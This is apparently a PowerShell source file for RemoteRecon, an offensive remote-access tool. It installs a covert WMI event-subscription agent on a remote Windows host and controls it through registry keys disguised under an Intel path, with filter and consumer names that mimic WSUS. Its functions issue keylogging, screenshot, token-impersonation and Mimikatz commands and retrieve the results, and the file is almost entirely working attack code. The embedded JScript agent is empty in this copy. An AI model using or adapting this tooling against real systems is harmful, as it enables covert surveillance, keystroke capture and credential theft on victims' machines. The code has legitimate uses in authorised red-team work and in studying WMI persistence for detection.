function Install-RemoteRecon {
    <#
    .SYNOPSIS
    Use this function to install the RemoteRecon agent on a remote system.
    
    Author: Chris Ross (@xorrior)
    License: BSD 3-Clause

    .DESCRIPTION
    Use this function to install the RemoteRecon agent on a remote system. Installation involves install a remote 
    WMI event subscription with an ActiveScriptEventConsumer. The JScript payload for this subscription will be 
    RemoteRecon. The event will fire upon a change in the Run registry value. 

    .PARAMETER ComputerName

    Host name or IP to target

    .PARAMETER RegistryPath

    Base registry key where RemoteRecon will be installed.

    .PARAMETER FilterName

    Name to use for the Filter.

    .PARAMETER ConsumerName

    Name to use for the ActiveScriptEventConsumer.

    .PARAMETER UserName

    UserName of the account to use for the Credential parameter.

    .PARAMETER Password

    Password of the account to use for the Credential parameter.
    
    .EXAMPLE
    Install the RemoteRecon agent on a remote system.

    Install-RemoteRecon -ComputerName 'Test.Domain.Local'

    .EXAMPLE
    Install the RemoteRecon agent on a remote system using the specified credentials

    Install-RemoteRecon -ComputerName 'Test.Domain.Local' -UserName 'bob' -Password 'miller'

    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false, ParameterSetName = 'Credential')]
        [ValidateNotNullOrEmpty()]
        [string]$ComputerName,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$RegistryPath = "SOFTWARE\Intel\PSIS",

        [parameter(Mandatory=$False)]
        [ValidateNotNullOrEmpty()]
        [string]$FilterName = 'WSUSFilter',

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$ConsumerName = 'WSUSConsumer',

        [parameter(Mandatory=$false, ParameterSetName = 'Credential')]
        [ValidateNotNullOrEmpty()]
        [string]$Username,

        [parameter(Mandatory=$false, ParameterSetName = 'Credential')]
        [ValidateNotNullOrEmpty()]
        [string]$Password
    )

    $wmiArgs = @{}
    $commonArgs = @{}

    #default key values

    $RunKey = "Run"
    $CommandKey = "Command"
    $CommandArgsKey = "Args"
    $ResultsKey = "Result"
    $ScreenShotKey = "Screenshot"
    $KeylogKey = "Keylog"

    #if the credential parametersetname is used, assign the credential object and computername appropriately
    if ($PSCmdlet.ParameterSetName -eq 'Credential') {
        #Check if UserName and password are given
        if ($PSBoundParameters['Username'] -and $PSBoundParameters['Password']) {
            $secPassword = $Password | ConvertTo-SecureString -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential $Username,$secPassword
            $commonArgs['Credential'] = $credential
        }

        if ($PSBoundParameters['ComputerName']) {
            $commonArgs['ComputerName'] = $ComputerName
        }
    }

    $HKEY_LOCAL_MACHINE = [UInt32]2147483650
    $RegistryPath = $RegistryPath.Replace('\', '\\')

    #Setup the registry keys for RemoteRecon C2
    $wmiArgs['Namespace'] = 'root\default'
    $wmiArgs['Class'] = 'StdRegProv'
    $wmiArgs['Name'] = "CreateKey"
    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath

    Write-Verbose "[+] Setting up registry keys for RemoteRecon C2"
    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to create registry key for RemoteRecon"
        $result
        break
    }

    $wmiArgs['Name'] = "SetStringValue"
    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$RunKey

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set value for $RunKey"
        $result
        break
    }

    $wmiArgs['Name'] = "SetDWORDValue"
    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$CommandKey,0

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set value for $CommandKey"
        $result
        break
    }

    $wmiArgs['Name'] = "SetStringValue"
    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$CommandArgsKey

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set value for $CommandArgsKey"
        $result
        break
    }

    $wmiArgs['Name'] = "SetDWORDValue"
    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ResultsKey,0

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set value for $ResultsKey"
        $result
        break
    }

    $wmiArgs['Name'] = "SetStringValue"
    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$ScreenShotKey

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set value for $ScreenShotKey"
        $result
        break
    }

    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$KeylogKey

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set value for $KeylogKey"
        $result
        break
    }

    #Setup the Remote Wmi event subscription to trigger Remote Recon Execution
    $EventFilterArgs = @{
        EventNamespace = 'root\cimv2'
        Name = $FilterName
        Query = "SELECT * FROM RegistryValueChangeEvent WHERE Hive='HKEY_LOCAL_MACHINE' AND KeyPath='$RegistryPath' AND ValueName='$RunKey'"
        QueryLanguage = "WQL"
    }

    Start-Sleep -Seconds 10
    #Install the filter
    Write-Verbose "[+] Installing the filter"
    $Filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments $EventFilterArgs @commonArgs

    $RemoteReconJS = $RemoteReconJS -replace 'BASE_PATH',$RegistryPath
    $RemoteReconJS = $RemoteReconJS -replace 'INIT_KEY',$RunKey
    $RemoteReconJS = $RemoteReconJS -replace 'COMMAND_KEY',$CommandKey
    $RemoteReconJS = $RemoteReconJS -replace 'COMMAND_ARG_KEY',$CommandArgsKey
    $RemoteReconJS = $RemoteReconJS -replace 'COMMAND_RESULT_KEY',$ResultsKey
    $RemoteReconJS = $RemoteReconJS -replace 'SCSTORE_KEY',$ScreenShotKey
    $RemoteReconJS = $RemoteReconJS -replace 'KLSTORE_KEY',$KeylogKey

    $ActiveScriptEventConsumerArgs = @{
        Name = $ConsumerName
        ScriptingEngine = 'JScript'
        ScriptText = $RemoteReconJS
    }

    Write-Verbose "[+] Installing the ActiveScriptEventConsumer"
    $Consumer =  Set-WmiInstance -Namespace "root\subscription" -Class "ActiveScriptEventConsumer" -Arguments $ActiveScriptEventConsumerArgs @commonArgs
    Start-Sleep -Seconds 5

    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }

    

    Write-Verbose "[+] Creating the FilterToConsumer binding"
    Start-Sleep -Seconds 10
    $FilterToConsumerBinding = Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments $FilterToConsumerArgs @commonArgs

    Write-Verbose "[+] Triggering RemoteRecon execution via the registry on $ComputerName"

    Start-Sleep -Seconds 10

    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"Start",$RunKey

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set registry value for $RunKey and trigger RemoteRecon execution"
        break
    }

    Write-Verbose "[+] RemoteRecon started"

    Write-Verbose "[+] Cleaning up the subscription"
    Start-Sleep -Seconds 5
    $EventConsumerToCleanup = Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer -Filter "Name = '$ConsumerName'" @commonArgs
    $EventFilterToCleanup = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name = '$FilterName'" @commonArgs
    $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root\subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" @commonArgs

    $EventConsumerToCleanup | Remove-WmiObject
    $EventFilterToCleanup | Remove-WmiObject
    $FilterConsumerBindingToCleanup | Remove-WmiObject

    $OutputObject = New-Object -TypeName PSObject
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'ComputerName' -Value $ComputerName
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'BaseRegistryPath' -Value $RegistryPath
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'RunKey' -Value $RunKey
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandKey' -Value $CommandKey
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandArgsKey' -Value $CommandArgsKey
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'ResultsKey' -Value $ResultsKey
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'ScreeShotResultKey' -Value $ScreenShotKey
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'KeyLogResultKey' -Value $KeylogKey

    $OutputObject
}

#DEBUG LINE
#Install-RemoteRecon -Verbose
function Invoke-RemoteReconCmd {
    <#
    .SYNOPSIS
    Use this function to issue and RemoteRecon agent commands.

    Author: Chris Ross (@xorrior)
    License: BSD 3-Clause
    
    .DESCRIPTION
    Use this function to issue commands to a RemoteRecon agent via the registry.

    .PARAMETER ComputerName

    Target host to issue command

    .PARAMETER UserName

    UserName to create the PSCredential object.

    .PARAMETER Password

    Password to create the PSCredential object.

    .PARAMETER Impersonate

    SWITCH. Issue an Impersonate command.

    .PARAMETER Screenshot

    SWITCH. Issue a Screenshot command.

    .PARAMETER Keylog

    SWITCH. Issue a Keylog command.

    .PARAMETER KeylogStop

    SWITCH. Stop the keylogger.

    .PARAMETER ProcessId

    Id of the target process for the Keylog, Screenshot, or Impersonate commands.

    .PARAMETER Mimikatz

    SWITCH. Issue a Mimikatz command.

    .PARAMETER MimikatzCommand

    Command to run with Mimikatz.

    .PARAMETER PowerShell

    SWITCH. Issue a PowerShell command.

    .PARAMETER PowerShellCommand

    Powershell command to run with PowerShell module.

    .PARAMETER Sleep

    SWITCH. Issue a Sleep command

    .PARAMETER Time

    Amount of time to sleep.
    
    .EXAMPLE
    Issue a Screenshot command on a remote system with the specified PID. 

    Invoke-RemoteReconCmd -ComputerName 'RemotePwned.Domain.local' -Screenshot -ProcessId 4553
    
    .NOTES
    General notes
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$ComputerName,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$Username,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$Password,

        [parameter(Mandatory=$true, ParameterSetName='Impersonate')]
        [switch]$Impersonate,

        [parameter(Mandatory=$true, ParameterSetName='Screenshot')]
        [switch]$Screenshot,

        [parameter(Mandatory=$true, ParameterSetName='Keylog')]
        [switch]$Keylog,

        [parameter(Mandatory=$true, ParameterSetName='Keylog')]
        [switch]$KeylogStop,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [int]$ProcessId,

        [parameter(Mandatory=$true, ParameterSetName='Mimikatz')]
        [switch]$Mimikatz,

        [parameter(Mandatory=$true, ParameterSetName='Mimikatz')]
        [ValidateNotNullOrEmpty()]
        [string]$MimikatzCommand,

        [parameter(Mandatory=$true, ParameterSetName='PowerShell')]
        [switch]$PowerShell,

        [parameter(Mandatory=$false, ParameterSetName='PowerShell')]
        [ValidateNotNullOrEmpty()]
        [string]$PowerShellCommand,

        [parameter(Mandatory=$true, ParameterSetName='Sleep')]
        [switch]$Sleep,

        [parameter(Mandatory=$true, ParameterSetName='Sleep')]
        [ValidateNotNullOrEmpty()]
        [int]$Time,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$RegistryPath = "SOFTWARE\\Intel\\PSIS"
    )

    $wmiArgs = @{}
    $commonArgs = @{}

    $HKEY_LOCAL_MACHINE = [UInt32]2147483650
    $RegistryPath = $RegistryPath.Replace('\', '\\')

    #Yes I'm lazy. I declared all the key values here. So what.
    $RunKey = "Run"
    $CommandKey = "Command"
    $CommandArgsKey = "Args"
    $ResultsKey = "Result"
    $ScreenShotKey = "Screenshot"
    $KeylogKey = "Keylog"

    #Credentials will not work for local Wmi commands
    if ($PSBoundParameters['ComputerName'] -and ($PSBoundParameters['ComputerName'] -ne '.' -or $PSBoundParameters['ComputerName'] -ne 'localhost' -or $PSBoundParameters['ComputerName'] -ne '127.0.0.1')) {
        $commonArgs['ComputerName'] = $ComputerName

        if ($PSBoundParameters['Username'] -and $PSBoundParameters['Password']) {
            $secPassword = $Password | ConvertTo-SecureString -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential $Username,$secPassword
            $commonArgs['Credential'] = $credential
        }
    }

    $wmiArgs = @{
        Namespace = 'root\default'
        Class = 'StdRegProv'
        Name = 'SetStringValue'
    }

    $returnObject = New-Object -TypeName PSObject
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'ComputerName' -Value $ComputerName
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'RegistryPath' -Value $RegistryPath
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandKey' -Value $CommandKey
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandArgsKey' -Value $CommandArgsKey
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'Command' -Value ''
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandArguments' -Value ''

    switch ($PSCmdlet.ParameterSetName) {
        'Impersonate' {
            
            # Send the command argument first so it isn't missed when the agent picks up the command
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"$ProcessId",$CommandArgsKey
            $returnObject.CommandArguments = $ProcessId
            Write-Verbose "[+] Sending impersonate command arguments"
            $result = Invoke-WmiMethod @wmiArgs @commonArgs
            if ($result.ReturnValue -ne 0) {
                Write-Warning "[-] Unable to issue impersonate command."
            }
            
            #send the command 
            $wmiArgs['Name'] = "SetDWORDValue"
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$CommandKey,1
            $returnObject.Command = "impersonate"
            Write-Verbose "[+] Sending impersonate command"
            $result = Invoke-WmiMethod @wmiArgs @commonArgs
            if ($result.ReturnValue -ne 0) {
                Write-Warning "[-] Unable to issue impersonate command."
            }
        }

        'Screenshot' {

            # Send the command argument first so it isn't missed when the agent picks up the command
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"$ProcessId",$CommandArgsKey
            $returnObject.CommandArguments = $ProcessId
            Write-Verbose "[+] Sending impersonate command arguments"
            $result = Invoke-WmiMethod @wmiArgs @commonArgs
            if ($result.ReturnValue -ne 0) {
                Write-Warning "[-] Unable to issue impersonate command."
            }

            #send the command 
            $wmiArgs['Name'] = "SetDWORDValue"
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$CommandKey,3
            $returnObject.Command = "screenshot"
            Write-Verbose "[+] Sending screenshot command"
            $result = Invoke-WmiMethod @wmiArgs @commonArgs
            if ($result.ReturnValue -ne 0) {
                Write-Warning "[-] Unable to issue screenshot command."
            }

        }
        'Keylog' {
            # Send the command argument first so it isn't missed when the agent picks up the command
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"$ProcessId",$CommandArgsKey
            $returnObject.CommandArguments = $ProcessId
            Write-Verbose "[+] Sending Keylog command arguments"
            $result = Invoke-WmiMethod @wmiArgs @commonArgs
            if ($result.ReturnValue -ne 0) {
                Write-Warning "[-] Unable to issue Keylog command."
            }


            #send the command 
            $wmiArgs['Name'] = "SetDWORDValue"
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$CommandKey,2
            $returnObject.Command = "Keylog"
            Write-Verbose "[+] Sending Keylog command"
            $result = Invoke-WmiMethod @wmiArgs @commonArgs
            if ($result.ReturnValue -ne 0) {
                Write-Warning "[-] Unable to issue Keylog command."
            }
             #$wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"keylog",$CommandKey
        }
    }

    $returnObject
}

function Get-ReconResult {
    <#
    .SYNOPSIS
    Use this function to retrieve the result of any RemoteRecon command.
    
    .DESCRIPTION
    Use this function to retrieve the result of any RemoteRecon commands. This will obtain the result and result 
    data from the corresponding registry keys for a given path.
    
    .EXAMPLE
    An example
    
    .NOTES
    General notes
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$ComputerName,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$Username,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$Password,

        [parameter(Mandatory=$true, ParameterSetName = "Impersonate")]
        [switch]$Impersonate,

        [parameter(Mandatory=$true, ParameterSetName = "Screenshot")]
        [switch]$Screenshot,

        [parameter(Mandatory=$false, ParameterSetName = "Screenshot")]
        [ValidateNotNullOrEmpty()]
        [string]$FilePath = "$((Get-Location).Path)\$(Get-Date -f 'yyyy-mm-dd-hh-mm-ss').png",

        [parameter(Mandatory=$true, ParameterSetName = "Keylog")]
        [switch]$Keylog,

        [parameter(Mandatory=$false, ParameterSetName = "Keylog")]
        [switch]$Watch,

        [parameter(Mandatory=$false, ParameterSetName = "Keylog")]
        [ValidateNotNullOrEmpty()]
        [int]$Interval,

        [parameter(Mandatory=$true, ParameterSetName = "PowerShell")]
        [switch]$PowerShell,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$RegistryPath = "SOFTWARE\\Intel\\PSIS"

    )

    $wmiArgs = @{}
    $commonArgs = @{}

    $HKEY_LOCAL_MACHINE = [UInt32]2147483650
    $RegistryPath = $RegistryPath.Replace('\', '\\')

    $RunKey = "Run"
    $ResultsKey = "Result"
    $ScreenShotKey = "Screenshot"
    $KeylogKey = "Keylog"

    if ($PSBoundParameters['ComputerName'] -and ($PSBoundParameters['ComputerName'] -ne '.' -or $PSBoundParameters['ComputerName'] -ne 'localhost' -or $PSBoundParameters['ComputerName'] -ne '127.0.0.1')) {
        $commonArgs['ComputerName'] = $ComputerName

        if ($PSBoundParameters['Username'] -and $PSBoundParameters['Password']) {
            $secPassword = $Password | ConvertTo-SecureString -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential $Username,$secPassword
            $commonArgs['Credential'] = $credential
        }
    }

    $wmiArgs = @{
        Namespace = 'root\default'
        Class = 'StdRegProv'
        Name = 'GetDWORDValue'
    }

    $returnObject = New-Object -TypeName PSObject
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'ComputerName' -Value $ComputerName
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'RegistryPath' -Value $RegistryPath
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'ResultKey' -Value $ResultsKey
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'ReturnCode' -Value ''
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'Output' -Value ''

    switch ($PSCmdlet.ParameterSetName) {
        "Impersonate" { 
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ResultsKey
            $result = Invoke-WmiMethod @wmiArgs @commonArgs
            if ($result.ReturnValue -ne 0) {
                Write-Warning "[-] Unable to obtain result for Impersonate command"
            }
            else {
                $returnObject.ReturnCode = $result.sValue

                $wmiArgs['Name'] = "GetStringValue"
                $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$RunKey
                $result = Invoke-WmiMethod @wmiArgs @commonArgs
                if ($result.ReturnValue -ne 0) {
                    Write-Warning "[-] Unable to obtain output for Impersonate command"
                }

                $returnObject.Output = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($result.sValue))
            }
         }
        "Screenshot" {
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ResultsKey
            $result = Invoke-WmiMethod @wmiArgs @commonArgs
            if ($result.ReturnValue -ne 0) {
                Write-Warning "[-] Unable to obtain result for Impersonate command"
            }
            else {
                $returnObject.ReturnCode = $result.sValue

                $wmiArgs['Name'] = "GetStringValue"
                $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ScreenShotKey
                $result = Invoke-WmiMethod @wmiArgs @commonArgs
                if ($result.ReturnValue -ne 0) {
                    Write-Warning "[-] Unable to obtain output for Impersonate command"
                }

                if ($result.sValue -ne $null) {
                    $png = [Convert]::FromBase64String($result.sValue)
                    Set-Content -Path $FilePath -Encoding Byte -Value $png
                    $returnObject.Output = Get-ChildItem -Path $FilePath
                }
                
            }
        }
        "Keylog" {
            
        }
        Default {}
    }

    $returnObject
}

$RemoteReconJS = @'

'@